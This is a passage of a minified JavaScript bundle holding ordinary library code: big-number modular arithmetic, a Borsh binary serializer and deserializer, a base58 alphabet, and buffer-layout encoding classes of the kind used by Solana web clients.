                            if ("p25519" !== e) throw new Error("Unknown prime " + e);
                            t = new S
                        }
                        return v[e] = t, t
                    }, I.prototype._verify1 = function(e) {
                        r(0 === e.negative, "red works only with positives"), r(e.red, "red works only with red numbers")
                    }, I.prototype._verify2 = function(e, t) {
                        r(0 === (e.negative | t.negative), "red works only with positives"), r(e.red && e.red === t.red, "red works only with red numbers")
                    }, I.prototype.imod = function(e) {
                        return this.prime ? this.prime.ireduce(e)._forceRed(this) : (l(e, e.umod(this.m)._forceRed(this)), e)
                    }, I.prototype.neg = function(e) {
                        return e.isZero() ? e.clone() : this.m.sub(e)._forceRed(this)
                    }, I.prototype.add = function(e, t) {
                        this._verify2(e, t);
                        var n = e.add(t);
                        return n.cmp(this.m) >= 0 && n.isub(this.m), n._forceRed(this)
                    }, I.prototype.iadd = function(e, t) {
                        this._verify2(e, t);
                        var n = e.iadd(t);
                        return n.cmp(this.m) >= 0 && n.isub(this.m), n
                    }, I.prototype.sub = function(e, t) {
                        this._verify2(e, t);
                        var n = e.sub(t);
                        return n.cmpn(0) < 0 && n.iadd(this.m), n._forceRed(this)
                    }, I.prototype.isub = function(e, t) {
                        this._verify2(e, t);
                        var n = e.isub(t);
                        return n.cmpn(0) < 0 && n.iadd(this.m), n
                    }, I.prototype.shl = function(e, t) {
                        return this._verify1(e), this.imod(e.ushln(t))
                    }, I.prototype.imul = function(e, t) {
                        return this._verify2(e, t), this.imod(e.imul(t))
                    }, I.prototype.mul = function(e, t) {
                        return this._verify2(e, t), this.imod(e.mul(t))
                    }, I.prototype.isqr = function(e) {
                        return this.imul(e, e.clone())
                    }, I.prototype.sqr = function(e) {
                        return this.mul(e, e)
                    }, I.prototype.sqrt = function(e) {
                        if (e.isZero()) return e.clone();
                        var t = this.m.andln(3);
                        if (r(t % 2 === 1), 3 === t) {
                            var n = this.m.add(new o(1)).iushrn(2);
                            return this.pow(e, n)
                        }
                        for (var i = this.m.subn(1), s = 0; !i.isZero() && 0 === i.andln(1);) s++, i.iushrn(1);
                        r(!i.isZero());
                        var a = new o(1).toRed(this),
                            u = a.redNeg(),
                            c = this.m.subn(1).iushrn(1),
                            l = this.m.bitLength();
                        for (l = new o(2 * l * l).toRed(this); 0 !== this.pow(l, c).cmp(u);) l.redIAdd(u);
                        for (var f = this.pow(l, i), h = this.pow(e, i.addn(1).iushrn(1)), d = this.pow(e, i), p = s; 0 !== d.cmp(a);) {
                            for (var y = d, g = 0; 0 !== y.cmp(a); g++) y = y.redSqr();
                            r(g < p);
                            var m = this.pow(f, new o(1).iushln(p - g - 1));
                            h = h.redMul(m), f = m.redSqr(), d = d.redMul(f), p = g
                        }
                        return h
                    }, I.prototype.invm = function(e) {
                        var t = e._invmp(this.m);
                        return 0 !== t.negative ? (t.negative = 0, this.imod(t).redNeg()) : this.imod(t)
                    }, I.prototype.pow = function(e, t) {
                        if (t.isZero()) return new o(1).toRed(this);
                        if (0 === t.cmpn(1)) return e.clone();
                        var n = new Array(16);
                        n[0] = new o(1).toRed(this), n[1] = e;
                        for (var r = 2; r < n.length; r++) n[r] = this.mul(n[r - 1], e);
                        var i = n[0],
                            s = 0,
                            a = 0,
                            u = t.bitLength() % 26;
                        for (0 === u && (u = 26), r = t.length - 1; r >= 0; r--) {
                            for (var c = t.words[r], l = u - 1; l >= 0; l--) {
                                var f = c >> l & 1;
                                i !== n[0] && (i = this.sqr(i)), 0 !== f || 0 !== s ? (s <<= 1, s |= f, (4 === ++a || 0 === r && 0 === l) && (i = this.mul(i, n[s]), a = 0, s = 0)) : a = 0
                            }
                            u = 26
                        }
                        return i
                    }, I.prototype.convertTo = function(e) {
                        var t = e.umod(this.m);
                        return t === e ? t.clone() : t
                    }, I.prototype.convertFrom = function(e) {
                        var t = e.clone();
                        return t.red = null, t
                    }, o.mont = function(e) {
                        return new x(e)
                    }, i(x, I), x.prototype.convertTo = function(e) {
                        return this.imod(e.ushln(this.shift))
                    }, x.prototype.convertFrom = function(e) {
                        var t = this.imod(e.mul(this.rinv));
                        return t.red = null, t
                    }, x.prototype.imul = function(e, t) {
                        if (e.isZero() || t.isZero()) return e.words[0] = 0, e.length = 1, e;
                        var n = e.imul(t),
                            r = n.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            i = n.isub(r).iushrn(this.shift),
                            o = i;
                        return i.cmp(this.m) >= 0 ? o = i.isub(this.m) : i.cmpn(0) < 0 && (o = i.iadd(this.m)), o._forceRed(this)
                    }, x.prototype.mul = function(e, t) {
                        if (e.isZero() || t.isZero()) return new o(0)._forceRed(this);
                        var n = e.mul(t),
                            r = n.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            i = n.isub(r).iushrn(this.shift),
                            s = i;
                        return i.cmp(this.m) >= 0 ? s = i.isub(this.m) : i.cmpn(0) < 0 && (s = i.iadd(this.m)), s._forceRed(this)
                    }, x.prototype.invm = function(e) {
                        return this.imod(e._invmp(this.m).mul(this.r2))._forceRed(this)
                    }
                }(e = n.nmd(e), this)
            },
            5127: function(e, t, n) {
                "use strict";
                var r = this && this.__createBinding || (Object.create ? function(e, t, n, r) {
                        void 0 === r && (r = n), Object.defineProperty(e, r, {
                            enumerable: !0,
                            get: function() {
                                return t[n]
                            }
                        })
                    } : function(e, t, n, r) {
                        void 0 === r && (r = n), e[r] = t[n]
                    }),
                    i = this && this.__setModuleDefault || (Object.create ? function(e, t) {
                        Object.defineProperty(e, "default", {
                            enumerable: !0,
                            value: t
                        })
                    } : function(e, t) {
                        e.default = t
                    }),
                    o = this && this.__decorate || function(e, t, n, r) {
                        var i, o = arguments.length,
                            s = o < 3 ? t : null === r ? r = Object.getOwnPropertyDescriptor(t, n) : r;
                        if ("object" === typeof Reflect && "function" === typeof Reflect.decorate) s = Reflect.decorate(e, t, n, r);
                        else
                            for (var a = e.length - 1; a >= 0; a--)(i = e[a]) && (s = (o < 3 ? i(s) : o > 3 ? i(t, n, s) : i(t, n)) || s);
                        return o > 3 && s && Object.defineProperty(t, n, s), s
                    },
                    s = this && this.__importStar || function(e) {
                        if (e && e.__esModule) return e;
                        var t = {};
                        if (null != e)
                            for (var n in e) "default" !== n && Object.hasOwnProperty.call(e, n) && r(t, e, n);
                        return i(t, e), t
                    },
                    a = this && this.__importDefault || function(e) {
                        return e && e.__esModule ? e : {
                            default: e
                        }
                    };
                Object.defineProperty(t, "__esModule", {
                    value: !0
                }), t.deserializeUnchecked = t.deserialize = t.serialize = t.BinaryReader = t.BinaryWriter = t.BorshError = t.baseDecode = t.baseEncode = void 0;
                const u = a(n(518)),
                    c = a(n(6315)),
                    l = s(n(9344)),
                    f = new("function" !== typeof TextDecoder ? l.TextDecoder : TextDecoder)("utf-8", {
                        fatal: !0
                    });
                t.baseEncode = function(e) {
                    return "string" === typeof e && (e = Buffer.from(e, "utf8")), c.default.encode(Buffer.from(e))
                }, t.baseDecode = function(e) {
                    return Buffer.from(c.default.decode(e))
                };
                const h = 1024;
                class d extends Error {
                    constructor(e) {
                        super(e), this.fieldPath = [], this.originalMessage = e
                    }
                    addToFieldPath(e) {
                        this.fieldPath.splice(0, 0, e), this.message = this.originalMessage + ": " + this.fieldPath.join(".")
                    }
                }
                t.BorshError = d;
                class p {
                    constructor() {
                        this.buf = Buffer.alloc(h), this.length = 0
                    }
                    maybeResize() {
                        this.buf.length < 16 + this.length && (this.buf = Buffer.concat([this.buf, Buffer.alloc(h)]))
                    }
                    writeU8(e) {
                        this.maybeResize(), this.buf.writeUInt8(e, this.length), this.length += 1
                    }
                    writeU16(e) {
                        this.maybeResize(), this.buf.writeUInt16LE(e, this.length), this.length += 2
                    }
                    writeU32(e) {
                        this.maybeResize(), this.buf.writeUInt32LE(e, this.length), this.length += 4
                    }
                    writeU64(e) {
                        this.maybeResize(), this.writeBuffer(Buffer.from(new u.default(e).toArray("le", 8)))
                    }
                    writeU128(e) {
                        this.maybeResize(), this.writeBuffer(Buffer.from(new u.default(e).toArray("le", 16)))
                    }
                    writeU256(e) {
                        this.maybeResize(), this.writeBuffer(Buffer.from(new u.default(e).toArray("le", 32)))
                    }
                    writeU512(e) {
                        this.maybeResize(), this.writeBuffer(Buffer.from(new u.default(e).toArray("le", 64)))
                    }
                    writeBuffer(e) {
                        this.buf = Buffer.concat([Buffer.from(this.buf.subarray(0, this.length)), e, Buffer.alloc(h)]), this.length += e.length
                    }
                    writeString(e) {
                        this.maybeResize();
                        const t = Buffer.from(e, "utf8");
                        this.writeU32(t.length), this.writeBuffer(t)
                    }
                    writeFixedArray(e) {
                        this.writeBuffer(Buffer.from(e))
                    }
                    writeArray(e, t) {
                        this.maybeResize(), this.writeU32(e.length);
                        for (const n of e) this.maybeResize(), t(n)
                    }
                    toArray() {
                        return this.buf.subarray(0, this.length)
                    }
                }

                function y(e, t, n) {
                    const r = n.value;
                    n.value = function() {
                        try {
                            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                            return r.apply(this, t)
                        } catch (i) {
                            if (i instanceof RangeError) {
                                const e = i.code;
                                if (["ERR_BUFFER_OUT_OF_BOUNDS", "ERR_OUT_OF_RANGE"].indexOf(e) >= 0) throw new d("Reached the end of buffer when deserializing")
                            }
                            throw i
                        }
                    }
                }
                t.BinaryWriter = p;
                class g {
                    constructor(e) {
                        this.buf = e, this.offset = 0
                    }
                    readU8() {
                        const e = this.buf.readUInt8(this.offset);
                        return this.offset += 1, e
                    }
                    readU16() {
                        const e = this.buf.readUInt16LE(this.offset);
                        return this.offset += 2, e
                    }
                    readU32() {
                        const e = this.buf.readUInt32LE(this.offset);
                        return this.offset += 4, e
                    }
                    readU64() {
                        const e = this.readBuffer(8);
                        return new u.default(e, "le")
                    }
                    readU128() {
                        const e = this.readBuffer(16);
                        return new u.default(e, "le")
                    }
                    readU256() {
                        const e = this.readBuffer(32);
                        return new u.default(e, "le")
                    }
                    readU512() {
                        const e = this.readBuffer(64);
                        return new u.default(e, "le")
                    }
                    readBuffer(e) {
                        if (this.offset + e > this.buf.length) throw new d(`Expected buffer length ${e} isn't within bounds`);
                        const t = this.buf.slice(this.offset, this.offset + e);
                        return this.offset += e, t
                    }
                    readString() {
                        const e = this.readU32(),
                            t = this.readBuffer(e);
                        try {
                            return f.decode(t)
                        } catch (n) {
                            throw new d(`Error decoding UTF-8 string: ${n}`)
                        }
                    }
                    readFixedArray(e) {
                        return new Uint8Array(this.readBuffer(e))
                    }
                    readArray(e) {
                        const t = this.readU32(),
                            n = Array();
                        for (let r = 0; r < t; ++r) n.push(e());
                        return n
                    }
                }

                function m(e) {
                    return e.charAt(0).toUpperCase() + e.slice(1)
                }

                function w(e, t, n, r, i) {
                    try {
                        if ("string" === typeof r) i[`write${m(r)}`](n);
                        else if (r instanceof Array)
                            if ("number" === typeof r[0]) {
                                if (n.length !== r[0]) throw new d(`Expecting byte array of length ${r[0]}, but got ${n.length} bytes`);
                                i.writeFixedArray(n)
                            } else if (2 === r.length && "number" === typeof r[1]) {
                            if (n.length !== r[1]) throw new d(`Expecting byte array of length ${r[1]}, but got ${n.length} bytes`);
                            for (let t = 0; t < r[1]; t++) w(e, null, n[t], r[0], i)
                        } else i.writeArray(n, (n => {
                            w(e, t, n, r[0], i)
                        }));
                        else if (void 0 !== r.kind) switch (r.kind) {
                            case "option":
                                null === n || void 0 === n ? i.writeU8(0) : (i.writeU8(1), w(e, t, n, r.type, i));
                                break;
                            case "map":
                                i.writeU32(n.size), n.forEach(((n, o) => {
                                    w(e, t, o, r.key, i), w(e, t, n, r.value, i)
                                }));
                                break;
                            default:
                                throw new d(`FieldType ${r} unrecognized`)
                        } else b(e, n, i)
                    } catch (o) {
                        throw o instanceof d && o.addToFieldPath(t), o
                    }
                }

                function b(e, t, n) {
                    if ("function" === typeof t.borshSerialize) return void t.borshSerialize(n);
                    const r = e.get(t.constructor);
                    if (!r) throw new d(`Class ${t.constructor.name} is missing in schema`);
                    if ("struct" === r.kind) r.fields.map((r => {
                        let [i, o] = r;
                        w(e, i, t[i], o, n)
                    }));
                    else {
                        if ("enum" !== r.kind) throw new d(`Unexpected schema kind: ${r.kind} for ${t.constructor.name}`); {
                            const i = t[r.field];
                            for (let o = 0; o < r.values.length; ++o) {
                                const [s, a] = r.values[o];
                                if (s === i) {
                                    n.writeU8(o), w(e, s, t[s], a, n);
                                    break
                                }
                            }
                        }
                    }
                }

                function v(e, t, n, r) {
                    try {
                        if ("string" === typeof n) return r[`read${m(n)}`]();
                        if (n instanceof Array) {
                            if ("number" === typeof n[0]) return r.readFixedArray(n[0]);
                            if ("number" === typeof n[1]) {
                                const t = [];
                                for (let i = 0; i < n[1]; i++) t.push(v(e, null, n[0], r));
                                return t
                            }
                            return r.readArray((() => v(e, t, n[0], r)))
                        }
                        if ("option" === n.kind) {
                            return r.readU8() ? v(e, t, n.type, r) : void 0
                        }
                        if ("map" === n.kind) {
                            let i = new Map;
                            const o = r.readU32();
                            for (let s = 0; s < o; s++) {
                                const o = v(e, t, n.key, r),
                                    s = v(e, t, n.value, r);
                                i.set(o, s)
                            }
                            return i
                        }
                        return A(e, n, r)
                    } catch (i) {
                        throw i instanceof d && i.addToFieldPath(t), i
                    }
                }

                function A(e, t, n) {
                    if ("function" === typeof t.borshDeserialize) return t.borshDeserialize(n);
                    const r = e.get(t);
                    if (!r) throw new d(`Class ${t.name} is missing in schema`);
                    if ("struct" === r.kind) {
                        const r = {};
                        for (const [i, o] of e.get(t).fields) r[i] = v(e, i, o, n);
                        return new t(r)
                    }
                    if ("enum" === r.kind) {
                        const i = n.readU8();
                        if (i >= r.values.length) throw new d(`Enum index: ${i} is out of range`);
                        const [o, s] = r.values[i];
                        return new t({
                            [o]: v(e, o, s, n)
                        })
                    }
                    throw new d(`Unexpected schema kind: ${r.kind} for ${t.constructor.name}`)
                }
                o([y], g.prototype, "readU8", null), o([y], g.prototype, "readU16", null), o([y], g.prototype, "readU32", null), o([y], g.prototype, "readU64", null), o([y], g.prototype, "readU128", null), o([y], g.prototype, "readU256", null), o([y], g.prototype, "readU512", null), o([y], g.prototype, "readString", null), o([y], g.prototype, "readFixedArray", null), o([y], g.prototype, "readArray", null), t.BinaryReader = g, t.serialize = function(e, t) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : p;
                    const r = new n;
                    return b(e, t, r), r.toArray()
                }, t.deserialize = function(e, t, n) {
                    let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : g;
                    const i = new r(n),
                        o = A(e, t, i);
                    if (i.offset < n.length) throw new d(`Unexpected ${n.length-i.offset} bytes after deserialized data`);
                    return o
                }, t.deserializeUnchecked = function(e, t, n) {
                    let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : g;
                    const i = new r(n);
                    return A(e, t, i)
                }
            },
            6315: (e, t, n) => {
                var r = n(2307);
                e.exports = r("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")
            },
            7772: (e, t) => {
                "use strict";
                class n {
                    constructor(e, t) {
                        if (!Number.isInteger(e)) throw new TypeError("span must be an integer");
                        this.span = e, this.property = t
                    }
                    makeDestinationObject() {
                        return {}
                    }
                    decode(e, t) {
                        throw new Error("Layout is abstract")
                    }
                    encode(e, t, n) {
                        throw new Error("Layout is abstract")
                    }
                    getSpan(e, t) {
                        if (0 > this.span) throw new RangeError("indeterminate span");
                        return this.span
                    }
                    replicate(e) {
                        const t = Object.create(this.constructor.prototype);
                        return Object.assign(t, this), t.property = e, t
                    }
                    fromArray(e) {}
                }

                function r(e, t) {
                    return t.property ? e + "[" + t.property + "]" : e
                }
                t.Layout = n, t.nameWithProperty = r, t.bindConstructorLayout = function(e, t) {
                    if ("function" !== typeof e) throw new TypeError("Class must be constructor");
                    if (e.hasOwnProperty("layout_")) throw new Error("Class is already bound to a layout");
                    if (!(t && t instanceof n)) throw new TypeError("layout must be a Layout");
                    if (t.hasOwnProperty("boundConstructor_")) throw new Error("layout is already bound to a constructor");
                    e.layout_ = t, t.boundConstructor_ = e, t.makeDestinationObject = () => new e, Object.defineProperty(e.prototype, "encode", {
                        value: function(e, n) {
                            return t.encode(this, e, n)
                        },
                        writable: !0
                    }), Object.defineProperty(e, "decode", {
                        value: function(e, n) {
                            return t.decode(e, n)
                        },
                        writable: !0
                    })
                };
                class i extends n {
                    isCount() {
                        throw new Error("ExternalLayout is abstract")
                    }
                }
                class o extends i {
                    constructor(e, t) {
                        if (void 0 === e && (e = 1), !Number.isInteger(e) || 0 >= e) throw new TypeError("elementSpan must be a (positive) integer");
                        super(-1, t), this.elementSpan = e
                    }
                    isCount() {
                        return !0
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        const n = e.length - t;
                        return Math.floor(n / this.elementSpan)
                    }
                    encode(e, t, n) {
                        return 0
                    }
                }
                class s extends i {
                    constructor(e, t, r) {
                        if (!(e instanceof n)) throw new TypeError("layout must be a Layout");
                        if (void 0 === t) t = 0;
                        else if (!Number.isInteger(t)) throw new TypeError("offset must be integer or undefined");
                        super(e.span, r || e.property), this.layout = e, this.offset = t
                    }
                    isCount() {
                        return this.layout instanceof a || this.layout instanceof u
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), this.layout.decode(e, t + this.offset)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), this.layout.encode(e, t, n + this.offset)
                    }
                }
                class a extends n {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readUIntLE(t, this.span)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeUIntLE(e, n, this.span), this.span
                    }
                }
                class u extends n {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readUIntBE(t, this.span)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeUIntBE(e, n, this.span), this.span
                    }
                }
                class c extends n {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readIntLE(t, this.span)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeIntLE(e, n, this.span), this.span
                    }
                }
                class l extends n {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readIntBE(t, this.span)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeIntBE(e, n, this.span), this.span
                    }
                }
                const f = Math.pow(2, 32);

                function h(e) {
                    const t = Math.floor(e / f);
                    return {
                        hi32: t,
                        lo32: e - t * f
                    }
                }

                function d(e, t) {
                    return e * f + t
                }
                class p extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        const n = e.readUInt32LE(t);
                        return d(e.readUInt32LE(t + 4), n)
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = h(e);
                        return t.writeUInt32LE(r.lo32, n), t.writeUInt32LE(r.hi32, n + 4), 8
                    }
                }
                class y extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        return d(e.readUInt32BE(t), e.readUInt32BE(t + 4))
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = h(e);
                        return t.writeUInt32BE(r.hi32, n), t.writeUInt32BE(r.lo32, n + 4), 8
                    }
                }
                class g extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        const n = e.readUInt32LE(t);
                        return d(e.readInt32LE(t + 4), n)
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = h(e);
                        return t.writeUInt32LE(r.lo32, n), t.writeInt32LE(r.hi32, n + 4), 8
                    }
                }
                class m extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        return d(e.readInt32BE(t), e.readUInt32BE(t + 4))
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = h(e);
                        return t.writeInt32BE(r.hi32, n), t.writeUInt32BE(r.lo32, n + 4), 8
                    }
                }
                class w extends n {
                    constructor(e) {
                        super(4, e)
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readFloatLE(t)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeFloatLE(e, n), 4
                    }
                }
                class b extends n {
                    constructor(e) {
                        super(4, e)
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readFloatBE(t)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeFloatBE(e, n), 4
                    }
                }
                class v extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readDoubleLE(t)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeDoubleLE(e, n), 8
                    }
                }
                class A extends n {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e, t) {
                        return void 0 === t && (t = 0), e.readDoubleBE(t)
                    }
                    encode(e, t, n) {
                        return void 0 === n && (n = 0), t.writeDoubleBE(e, n), 8
                    }
                }
                class k extends n {
                    constructor(e, t, r) {
                        if (!(e instanceof n)) throw new TypeError("elementLayout must be a Layout");
                        if (!(t instanceof i && t.isCount() || Number.isInteger(t) && 0 <= t)) throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");
                        let o = -1;
                        !(t instanceof i) && 0 < e.span && (o = t * e.span), super(o, r), this.elementLayout = e, this.count = t
                    }
                    getSpan(e, t) {
                        if (0 <= this.span) return this.span;
                        void 0 === t && (t = 0);
                        let n = 0,
                            r = this.count;
                        if (r instanceof i && (r = r.decode(e, t)), 0 < this.elementLayout.span) n = r * this.elementLayout.span;
                        else {
                            let i = 0;
                            for (; i < r;) n += this.elementLayout.getSpan(e, t + n), ++i
                        }
                        return n
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        const n = [];
                        let r = 0,
                            o = this.count;
                        for (o instanceof i && (o = o.decode(e, t)); r < o;) n.push(this.elementLayout.decode(e, t)), t += this.elementLayout.getSpan(e, t), r += 1;
                        return n
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = this.elementLayout,
                            o = e.reduce(((e, i) => e + r.encode(i, t, n + e)), 0);
                        return this.count instanceof i && this.count.encode(e.length, t, n), o
                    }
                }
                class _ extends n {
                    constructor(e, t, r) {
                        if (!Array.isArray(e) || !e.reduce(((e, t) => e && t instanceof n), !0)) throw new TypeError("fields must be array of Layout instances");
                        "boolean" === typeof t && void 0 === r && (r = t, t = void 0);
                        for (const n of e)
                            if (0 > n.span && void 0 === n.property) throw new Error("fields cannot contain unnamed variable-length layout");
                        let i = -1;
                        try {
                            i = e.reduce(((e, t) => e + t.getSpan()), 0)
                        } catch (o) {}
                        super(i, t), this.fields = e, this.decodePrefixes = !!r
                    }
                    getSpan(e, t) {
                        if (0 <= this.span) return this.span;
                        void 0 === t && (t = 0);
                        let n = 0;
                        try {
                            n = this.fields.reduce(((n, r) => {
                                const i = r.getSpan(e, t);
                                return t += i, n + i
                            }), 0)
                        } catch (r) {
                            throw new RangeError("indeterminate span")
                        }
                        return n
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        const n = this.makeDestinationObject();
                        for (const r of this.fields)
                            if (void 0 !== r.property && (n[r.property] = r.decode(e, t)), t += r.getSpan(e, t), this.decodePrefixes && e.length === t) break;
                        return n
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = n;
                        let i = 0,
                            o = 0;
                        for (const s of this.fields) {
                            let r = s.span;
                            if (o = 0 < r ? r : 0, void 0 !== s.property) {
                                const i = e[s.property];
                                void 0 !== i && (o = s.encode(i, t, n), 0 > r && (r = s.getSpan(t, n)))
                            }
                            i = n, n += r
                        }
                        return i + o - r
                    }
                    fromArray(e) {
                        const t = this.makeDestinationObject();
                        for (const n of this.fields) void 0 !== n.property && 0 < e.length && (t[n.property] = e.shift());
                        return t
                    }
                    layoutFor(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        for (const t of this.fields)
                            if (t.property === e) return t
                    }
                    offsetOf(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        let t = 0;
                        for (const n of this.fields) {
                            if (n.property === e) return t;
                            0 > n.span ? t = -1 : 0 <= t && (t += n.span)
                        }
                    }
                }
                class E {
                    constructor(e) {
                        this.property = e
                    }
                    decode() {
                        throw new Error("UnionDiscriminator is abstract")
                    }
                    encode() {
                        throw new Error("UnionDiscriminator is abstract")
                    }
                }
                class S extends E {
                    constructor(e, t) {
                        if (!(e instanceof i && e.isCount())) throw new TypeError("layout must be an unsigned integer ExternalLayout");
                        super(t || e.property || "variant"), this.layout = e
                    }
                    decode(e, t) {
                        return this.layout.decode(e, t)
                    }
                    encode(e, t, n) {
                        return this.layout.encode(e, t, n)
                    }
                }
                class I extends n {
                    constructor(e, t, r) {
                        const o = e instanceof a || e instanceof u;
                        if (o) e = new S(new s(e));
                        else if (e instanceof i && e.isCount()) e = new S(e);
                        else if (!(e instanceof E)) throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");
                        if (void 0 === t && (t = null), !(null === t || t instanceof n)) throw new TypeError("defaultLayout must be null or a Layout");
                        if (null !== t) {
                            if (0 > t.span) throw new Error("defaultLayout must have constant span");
                            void 0 === t.property && (t = t.replicate("content"))
                        }
                        let c = -1;
                        t && (c = t.span, 0 <= c && o && (c += e.layout.span)), super(c, r), this.discriminator = e, this.usesPrefixDiscriminator = o, this.defaultLayout = t, this.registry = {};
                        let l = this.defaultGetSourceVariant.bind(this);
                        this.getSourceVariant = function(e) {
                            return l(e)
                        }, this.configGetSourceVariant = function(e) {
                            l = e.bind(this)
                        }
                    }
                    getSpan(e, t) {
                        if (0 <= this.span) return this.span;
                        void 0 === t && (t = 0);
                        const n = this.getVariant(e, t);
                        if (!n) throw new Error("unable to determine span for unrecognized variant");
                        return n.getSpan(e, t)
                    }
                    defaultGetSourceVariant(e) {
                        if (e.hasOwnProperty(this.discriminator.property)) {
                            if (this.defaultLayout && e.hasOwnProperty(this.defaultLayout.property)) return;
                            const t = this.registry[e[this.discriminator.property]];
                            if (t && (!t.layout || e.hasOwnProperty(t.property))) return t
                        } else
                            for (const t in this.registry) {
                                const n = this.registry[t];
                                if (e.hasOwnProperty(n.property)) return n
                            }
                        throw new Error("unable to infer src variant")
                    }
                    decode(e, t) {
                        let n;
                        void 0 === t && (t = 0);
                        const r = this.discriminator,
                            i = r.decode(e, t);
                        let o = this.registry[i];
                        if (void 0 === o) {
                            let s = 0;
                            o = this.defaultLayout, this.usesPrefixDiscriminator && (s = r.layout.span), n = this.makeDestinationObject(), n[r.property] = i, n[o.property] = this.defaultLayout.decode(e, t + s)
                        } else n = o.decode(e, t);
                        return n
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = this.getSourceVariant(e);
                        if (void 0 === r) {
                            const r = this.discriminator,
                                i = this.defaultLayout;
                            let o = 0;
                            return this.usesPrefixDiscriminator && (o = r.layout.span), r.encode(e[r.property], t, n), o + i.encode(e[i.property], t, n + o)
                        }
                        return r.encode(e, t, n)
                    }
                    addVariant(e, t, n) {
                        const r = new x(this, e, t, n);
                        return this.registry[e] = r, r
                    }
                    getVariant(e, t) {
                        let n = e;
                        return Buffer.isBuffer(e) && (void 0 === t && (t = 0), n = this.discriminator.decode(e, t)), this.registry[n]
                    }
                }
                class x extends n {
                    constructor(e, t, r, i) {
                        if (!(e instanceof I)) throw new TypeError("union must be a Union");
                        if (!Number.isInteger(t) || 0 > t) throw new TypeError("variant must be a (non-negative) integer");
                        if ("string" === typeof r && void 0 === i && (i = r, r = null), r) {
                            if (!(r instanceof n)) throw new TypeError("layout must be a Layout");
                            if (null !== e.defaultLayout && 0 <= r.span && r.span > e.defaultLayout.span) throw new Error("variant span exceeds span of containing union");
                            if ("string" !== typeof i) throw new TypeError("variant must have a String property")
                        }
                        let o = e.span;
                        0 > e.span && (o = r ? r.span : 0, 0 <= o && e.usesPrefixDiscriminator && (o += e.discriminator.layout.span)), super(o, i), this.union = e, this.variant = t, this.layout = r || null
                    }
                    getSpan(e, t) {
                        if (0 <= this.span) return this.span;
                        void 0 === t && (t = 0);
                        let n = 0;
                        return this.union.usesPrefixDiscriminator && (n = this.union.discriminator.layout.span), n + this.layout.getSpan(e, t + n)
                    }
                    decode(e, t) {
                        const n = this.makeDestinationObject();
                        if (void 0 === t && (t = 0), this !== this.union.getVariant(e, t)) throw new Error("variant mismatch");
                        let r = 0;
                        return this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout ? n[this.property] = this.layout.decode(e, t + r) : this.property ? n[this.property] = !0 : this.union.usesPrefixDiscriminator && (n[this.union.discriminator.property] = this.variant), n
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        let r = 0;
                        if (this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout && !e.hasOwnProperty(this.property)) throw new TypeError("variant lacks property " + this.property);
                        this.union.discriminator.encode(this.variant, t, n);
                        let i = r;
                        if (this.layout && (this.layout.encode(e[this.property], t, n + r), i += this.layout.getSpan(t, n + r), 0 <= this.union.span && i > this.union.span)) throw new Error("encoded variant overruns containing union");
                        return i
                    }
                    fromArray(e) {
                        if (this.layout) return this.layout.fromArray(e)
                    }
                }

                function M(e) {
